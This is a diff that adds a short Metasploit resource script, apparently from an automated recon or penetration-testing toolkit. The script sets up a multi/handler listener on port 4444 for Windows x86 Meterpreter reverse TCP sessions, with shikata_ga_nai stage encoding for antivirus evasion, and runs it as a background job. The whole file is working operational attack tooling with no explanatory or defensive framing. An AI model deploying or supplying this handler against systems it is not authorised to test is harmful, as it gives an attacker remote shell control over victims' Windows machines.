@@ -1,0 +1,13 @@
+# Windows x86 Meterpreter Reverse TCP Handler
+# Port: 4444 (standard msf port)
+# Requires: LHOST set globally via setup_msf_from_auto_recon.sh
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+
+echo "[*] Starting Windows x86 Meterpreter handler on ${LHOST}:4444"
+run -j
